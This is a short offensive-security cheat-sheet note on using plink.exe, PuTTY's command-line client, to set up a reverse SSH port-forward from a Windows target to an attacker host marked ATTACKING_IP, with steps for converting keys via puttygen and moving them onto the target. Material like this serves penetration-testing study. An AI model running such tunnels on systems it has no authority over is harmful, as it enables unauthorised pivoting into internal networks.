# Overview
>[!INFO]
Plink.exe is a Windows command line version of the PuTTY SSH client.
> Now that Windows comes with its **own inbuilt SSH client**, plink is less useful for modern servers; however, it is still a very useful tool, so we will cover it here.

## Reverse Connection

```powershell
cmd.exe /c echo y | .\plink.exe -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -N
```

## Windows Servers

```bash
# Note !
# Keys generated by ssh-keygen will not work properly here.

# Convert them using the "puttygen" tool :
sudo apt install putty-tools

# Conversion can be done with :
puttygen KEYFILE -o OUTPUT_KEY.ppk

# The resulting .ppk file can then be transferred to the Windows target

# Download a new copy of plinx.exe from 
https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html
```
